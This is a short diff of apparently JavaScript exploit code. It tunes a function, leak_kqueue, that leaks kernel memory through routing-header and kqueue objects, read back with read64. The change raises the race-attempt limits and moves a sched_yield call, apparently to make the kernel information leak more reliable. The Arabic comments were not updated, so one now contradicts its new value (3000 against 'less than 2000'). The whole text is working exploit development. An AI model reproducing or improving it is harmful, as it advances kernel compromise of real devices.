@@ -1634,8 +1634,8 @@ function leak_kqueue() {
   var magic_add  = leak_rthdr.add(0x08);
 
   var count      = 0;
-  var MAX_KQ     = 1500;     // أقل من 2000 لأن النجاح بقى أعلى
-  var INNER_MAX  = 700;      // أعلى من 500 لزيادة فرصة الـ window
+  var MAX_KQ     = 3000;     // أقل من 2000 لأن النجاح بقى أعلى
+  var INNER_MAX  = 900;      // أعلى من 500 لزيادة فرصة الـ window
 
   var success    = false;
 
@@ -1673,9 +1673,11 @@ function leak_kqueue() {
         break;
       }
 
-      sched_yield();
+      
       inner_tries++;
     }
+      
+    sched_yield();
 
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
